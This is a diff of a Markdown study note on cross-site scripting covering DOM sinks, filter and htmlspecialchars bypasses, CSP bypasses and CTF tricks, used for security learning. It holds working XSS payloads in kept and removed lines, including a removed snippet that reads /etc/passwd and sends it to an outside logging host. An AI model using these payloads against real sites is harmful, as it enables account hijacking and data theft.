@@ -1,13 +1,8 @@
 # Cross-Site Scripting  
-1. reflected xss:  
-`<?php echo 'xss, '.$_GET['script']; ?>`
-
-2. stored xss:  
-Forum or mail board, insert script into the content.  
-`<?php echo 'xss, '.$DB_value; ?>`
-
+1. reflected xss  
+2. stored xss  
 3. DOM xss: 最近の流行り  
-DOM XSS is different from reflected xss and stored xss. It based on **source** and **sink** which we can run dynamically on the client side.  
+The most difference between DOM XSS and the other two ones is not necessity of sending data to server. This also brings an advantage such as hackers don't need to bypass waf! DOM XSS completely runs on the client side browser.  
 
 Here are three kinds of common sinks:  
 1. document sink  
@@ -26,46 +21,23 @@ document.location = url;
 3. execution sink  
 e.g. `eval`, `setInterval`, `setTimeout`  
 
-Attention: Only reflective stored would interact with server because server needs to parse malicious script, but DOM is completely run in client side.  
-
-*  [XSS detection](#xss-detection)  
 *  [Bypass tricks](#bypass-tricks)  
 *  [htmlspecialchars bypass](#htmlspecialchars-bypass)
 *  [XSS-Auditor Introduction and bypass](#xss-auditor-intro-and-bypass)  
 *  [CSP Introduction and bypass](#csp-intro-and-bypass)  
-*  [Regular expression](#regular-expression)  
 *  [Some tricks played in CTF](#some-tricks-played-in-ctf)  
-*  [pop up](#pop-up)  
 *  [Cheatsheet](#cheatsheet)    
 *  [An interesting feature related to Transfer-Encoding](#an-interesting-feature-related-to-transfer-encoding)  
 *  [Reference](#reference)
 
-# XSS detection
-I am used to injecting script directly for test, test like following:  
-```js
-<script>alert(/1/);<script>
-<a href=1 onload=alert(1)>hi</a>
-```  
-
 # Bypass tricks
-* Obfuscation  
 * toUpperCase()  
 ```js
 İ (%c4%b0).toLowerCase() => i
 ı (%c4%b1).toUpperCase() => I
 ſ (%c5%bf) .toUpperCase() => S
 K (%E2%84%AA).toLowerCase() => k
-```
-* Only one time filter  
-```php
-str_replace('<script>','',$GET['hi'])  // it means script in content will become space
-// <scr<script>ipt>
 ```  
-* filter with regex  
-```php
-preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])
-// <img src=1 onerror=alert(1)>
-```
 * encode (parse the dangerous char  
   * url encode: `% + ASCII(hex) %3Cscript%3E`  
   * http://www.jsfuck.com/  
@@ -75,7 +47,7 @@ preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])
   htmlspecialchars($_GET['hi']);  // no open html tag for you
   ```  
   * unicode encode: %u + ASCII(hex) ASP,IIS will automatically parse unicode. `<%s%cr%u0131pt>`  
-  * `IBM037`,`IBM500`,`IBM1026`,`cp875` [Bypass RequestValidation on aspx](https://github.com/shinmao/Web-Security-Learning/blob/master/SQL-inj/README.md#bypass-requestvalidation-on-aspx)  
+  * `IBM037`,`IBM500`,`IBM1026`,`cp875` [Bypass RequestValidation on aspx]  
   * ascii encode
   ```js
   eval(String.fromCharCode(97,108,101,114,116,40,49,41))
@@ -91,15 +63,10 @@ preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])
 <img src="javas
 cript:
 alert(/1/);">
-```
-* XSS filters  
-* WAF  
-* HTML Sanitizer  
+```  
 * URL bypass `.`, `//`  
   RWCTF2018: `<?=ip2long("my-ip")` bypass dot，`\\` bypass `http://`  
   Sup: the first `/` is used to separate schema and path, the second `/` is part of path  
-* CSP(Content-Security-Policy)  
-  The content of CSP is in following :sweat:  
 
 # htmlspecialchars bypass  
 php nature function, can convert `&`,`'`,`"`,`<`,`>` five kinds of char to string. It won't filter out the single quote if it doesn't have the second parameter(`ENT_QUOTES`).  
@@ -276,16 +243,6 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
 非常推薦閱讀原文  
 [迅速查表CSP cheatsheet](http://dogewatch.github.io/2016/12/08/By-Pass-CSP/)
 
-
-# Regular expression
-js中會用正規表達式來過濾危險字符  
-```js
-/g -> 全局匹配
-/i -> case insensitive
-```
-參考如下文件：  
-[Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)
-
 # Some tricks played in CTF  
 Here are something what I learned in sites or CTF.  
 * Exploit with various `<tag>`  
@@ -302,13 +259,12 @@ Here are something what I learned in sites or CTF.
 <svg/onload=alert(1)>
 
 // body
-// 這種payload也可以繞過括號過濾
 <body/onload=javascript:window.onerror=eval;throw=alert\x281\x29’;>  
 ```
 * DOM based XSS  
 ```js
 <script>document.getElementById("contents").innerHTML=location.hash.substring(1);</script>
-// #之後的內容不會被傳送到server端
+// the data after hash won't be sent to the server side
 ```
 * bootstrap data-* 屬性  
 ```js
@@ -322,8 +278,6 @@ Here are something what I learned in sites or CTF.
 ```
 值得注意的是`data-target`本身不會造成xss漏洞，而是被帶到boostrap的環境下發揮效用的！  
 [XSS in data-target attribute #20184](https://github.com/twbs/bootstrap/issues/20184)  
-* Vue.js  
-with SSTI  
 * `<base>` overwrites the js in relative path  
 This is what I learned in RCTF-2018, CSP doesn't limit `base-uri` cause to `<base>` bypass, and there are also relative js imported from outside, now we can forge a js which is able to ignore the CSP rules.  
 **Exploit**:  
@@ -341,67 +295,19 @@ Also use the tag of `<base>` but the concept is different
 :point_down: the content of pop block is the name of the target  
 [reference](https://portswigger.net/blog/evading-csp-with-dom-based-dangling-markup)  
 
-# pop up
-Currently most of the browsers have stop from poping up window  
-@MasatoKinugawa find a trick to bypass:  
-```js
-<script>
-onkeydown=function(){
-    window.open('//example.com/','_blank','a');
-}
-onkeypress=function(){
-    window.open('about:blank','_blank').close();
-}
-```
-https://vulnerabledoma.in/popunder/keyevent.html  
-[Popunder restriction bypass with keydown and keypress event](https://bugs.chromium.org/p/chromium/issues/detail?id=836841)  
-
 # Cheatsheet
-```php
-</script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
-</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
-"><script>al\u0065rt(document.domain)</script>
-"><script>al\u{65}rt(document.domain)</script>
-"><img src=x onerror=prompt(1)>
-"><svg/onload=prompt(1)>
-"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
-
-// document.write take multiple arguments
-document.write("<s","crip","t>al","ert(","1)","</s","cript>")
-
-// Unicode-based
-location='http://\u{e01cc}\u{e01cd}\u{e01ce}\u{e01cf}\u{e01d0}\u{e01d1}\u{e01d2}\u{e01d3}\u{e01d4}\u{e01d5}google\u{e01da}\u{e01db}\u{e01dc}\u{e01dd}\u{e01de}\u{e01df}.com'
-
-// redirection
-atob.constructor(unescape([...escape((𐑬󠅯󠅣󠅡󠅴󠅩󠅯󠅮󠄽󠄧󠅨󠅴󠅴󠅰󠄺󠄯󠄯󠅩󠅢󠅭󠄮󠅣󠅯󠅭󠄧=ﾠ=>ﾠ).name)].filter((ﾠ,ㅤ)=>ㅤ%12<1|ㅤ%12>9).join([])))()  
-
-// Use xss to read file
-xmlhttp=new XMLHttpRequest();
-xmlhttp.onreadystatechange=function()
-{
-        if (xmlhttp.readyState==4 && xmlhttp.status==200)
-        {
-            document.location='http://kaibro.tw/log.php?c='+btoa(xmlhttp.responseText);
-        }
-}
-xmlhttp.open("GET","abc.php",true);
-xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-xmlhttp.send("url=file:///etc/passwd");
-```  
 [Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)  
+[PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  
 
 # An interesting feature related to Transfer-Encoding
 If POST request includeds header of `Transfer-Encoding: chunked`, the data stream would be responded to client without any changes. This causes to the malicious content such like XSS.(Has been patched in the lastest version)  
 [XSS due to the header Transfer-Encoding: chunked](https://bugs.php.net/bug.php?id=76582)
 
 # Reference
-1. The Web Application Hacker's Handbook  
-2. [看雪](https://www.kanxue.com)  
-3. [烏雲](http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)  
-4. [云淡风轻](http://blog.idhyt.com/2014/10/15/technic-xss-bypass/)  
-5. [freebuf](http://www.freebuf.com/articles/web/153055.html)  
-6. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)  
-7. [PayloadAllTheThings by swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)  
-8. [LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
-9. [通过严格的内容安全策略（CSP）重塑Web防御体系 by 安全客](https://www.anquanke.com/post/id/84655)  
-10. [CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)  
+1. [烏雲](http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)  
+2. [云淡风轻](http://blog.idhyt.com/2014/10/15/technic-xss-bypass/)  
+3. [freebuf](http://www.freebuf.com/articles/web/153055.html)  
+4. [BruteXSS](https://github.com/shawarkhanethicalhacker/BruteXSS)  
+5. [LoRexxar前端防御从入门到弃坑](https://lorexxar.cn/2017/10/25/csp-paper/)  
+6. [通过严格的内容安全策略（CSP）重塑Web防御体系 by 安全客](https://www.anquanke.com/post/id/84655)  
+7. [CVE-2018-5175:Universal CSP strict-dynamic bypass in Firefox](https://mksben.l0.cm/2018/05/cve-2018-5175-firefox-csp-strict-dynamic-bypass.html)  
